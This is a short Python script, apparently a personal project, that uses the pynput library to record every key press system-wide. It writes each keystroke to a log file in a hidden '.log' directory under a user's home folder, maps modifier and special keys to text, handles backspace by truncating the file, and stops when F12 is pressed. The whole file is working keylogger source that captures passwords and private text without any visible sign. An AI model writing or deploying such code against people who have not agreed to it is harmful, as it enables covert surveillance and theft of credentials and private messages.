from pynput.keyboard import Listener
import os

def f(key):
	key = str(key)
	key = key.replace("'", "")
	if key == 'Key.space':
		key = ' '
	if key == 'Key.alt':
		key = 'Alt-'
	if key == 'Key.ctrl':
		key = 'Ctl-'
	if key == 'Key.caps_lock':
		key = 'Caps-'
	if key == 'Key.shift':
		key = 'Shift-'
	if key == 'Key.shift_r':
		key = 'Shift_r-'
	if key == 'Key.cmd':
		key = 'Cmd-'
	if key == 'Key.enter':
		key = '\n'
	if key == 'Key.backspace':
		key = ''
		with open('/home/duy/.log/log.txt', 'rb+') as f:
			f.seek(-1, os.SEEK_END)
			f.truncate()
	# if key == 'Key.f12': windows
	# 	raise SystemExit(0)
	if key == 'Key.f12': 
		exit(0)

	with open('/home/duy/.log/log.txt', 'a') as file:
		file.write(key)


with Listener(on_press=f) as listener:
	listener.join()
